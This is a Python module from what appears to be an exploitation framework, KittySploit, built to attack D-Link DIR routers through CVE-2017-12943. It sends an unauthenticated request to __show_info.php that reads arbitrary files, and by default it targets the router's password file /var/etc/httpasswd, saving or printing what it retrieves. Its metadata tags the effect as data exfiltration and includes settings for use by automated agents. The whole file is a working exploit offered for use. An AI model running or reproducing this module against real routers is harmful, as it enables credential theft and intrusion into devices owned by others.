#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR __show_info.php file read (CVE-2017-12943)."""

from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'D-Link DIR - __show_info.php File Read (CVE-2017-12943)',
        'description': (
            'Reads arbitrary files via REQUIRE_FILE on /model/__show_info.php '
            '(CVE-2017-12943).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2017-12943'],
        'platform': Platform.LINUX,
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2017-12943'],
        'tags': ['dlink', 'router', 'lfi', 'file-read', 'unauth', 'cve-2017-12943'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'suggested_followups': ['scanner/http/cve_2017_12943_detect'],
            },
        },
    }

    file_read = OptString('/var/etc/httpasswd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip()
        if not remote.startswith('/'):
            remote = '/' + remote
        path = f'/model/__show_info.php?REQUIRE_FILE={quote(remote, safe="")}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        return (r.text or '') if r else ''

    def run(self):
        target = str(self.file_read or '/var/etc/httpasswd')
        print_status(f'Reading {target} via __show_info.php ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
